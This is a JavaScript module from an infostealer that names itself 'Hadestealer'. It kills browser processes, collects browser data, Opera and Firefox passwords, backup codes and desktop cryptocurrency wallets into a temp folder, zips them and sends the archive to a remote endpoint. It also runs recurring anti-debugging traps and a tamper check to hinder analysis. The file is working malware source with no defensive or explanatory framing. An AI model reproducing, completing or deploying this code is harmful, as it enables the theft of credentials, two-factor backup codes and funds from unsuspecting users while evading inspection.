'use strict';

var a7w = this && this.__importDefault || function (a) {
  if (a && a.__esModule) {
    return a;
  } else {
    return {
      default: a
    };
  }
};

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.sendBrowser = sendBrowser;
exports.runB = runB;

const fs = a7w(require("fs"));
const path = a7w(require("path"));
const os = a7w(require("os"));
const AdmZip = a7w(require("adm-zip"));
const sender = require("../api/sender");
const fileUtils = require("../utils/file");
const processUtils = require("../utils/process");
const dataCollector = require("./data");
const operaCollector = require("./opera");
const firefoxCollector = require("./firefox");
const backupCodes = require("../systems/backup_codes");
const wallets = require("../systems/wallets");

async function sendBrowser() {
  try {
    const tempFolder = path.default.join(os.default.tmpdir(), "Hadestealer");
    if (!fs.default.existsSync(tempFolder)) {
      return;
    }
    const summary = (0, fileUtils.buildFolderSummary)(tempFolder);
    const zip = new AdmZip.default();
    zip.addLocalFolder(tempFolder);
    const zipPath = path.default.join(os.default.tmpdir(), "Hadestaler_" + Date.now() + ".zip");
    zip.writeZip(zipPath);
    await (0, sender.sendBrowserData)(zipPath, summary);
    try {
      fs.default.unlinkSync(zipPath);
    } catch {}
  } catch (g) {}
}

async function runB() {
  const browsers = [
    "chrome", "msedge", "brave", "opera", "kometa", "orbitum", 
    "centbrowser", "7star", "sputnik", "vivaldi", 
    "epicprivacybrowser", "uran", "yandex", "iridium", 
    "operagx", "firefox"
  ];

  for (const browser of browsers) {
    await (0, processUtils.killProcess)(browser).catch(() => {});
  }

  const outputDir = path.default.join(os.default.tmpdir(), "Hadestealer");

  try {
    await dataCollector.all();
    await operaCollector.opera();
    await operaCollector.Operapass();
    await firefoxCollector.getFirefoxAllData();
    await backupCodes.processBackupCodesSendAll();
    await wallets.extractDesktopWallets(outputDir);
    await sendBrowser();
  } catch (h) {
    (0, sender.sendGenericMessage)("" + h);
  }
}

function antiDebug(state) {
  function checker(counter) {
    if (typeof counter === "string") {
      return function (h) {}.constructor("while (true) {}").apply("counter");
    } else if (("" + counter / counter).length !== 1 || counter % 20 === 0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    checker(++counter);
  }

  try {
    if (state) {
      return checker;
    } else {
      checker(0);
    }
  } catch (e) {}
}

(function () {
  antiDebug(false);
  setInterval(() => {
    antiDebug(false);
  }, 4000);
})();

(function () {
  const checkTamper = function () {
    const regex1 = new RegExp("function *\\( *\\)");
    const regex2 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const initCmd = "init";
    if (!regex1.test(initCmd + "chain") || !regex2.test(initCmd + "input")) {
      initCmd("0");
    } else {
      antiDebug();
    }
  };
  checkTamper();
})();
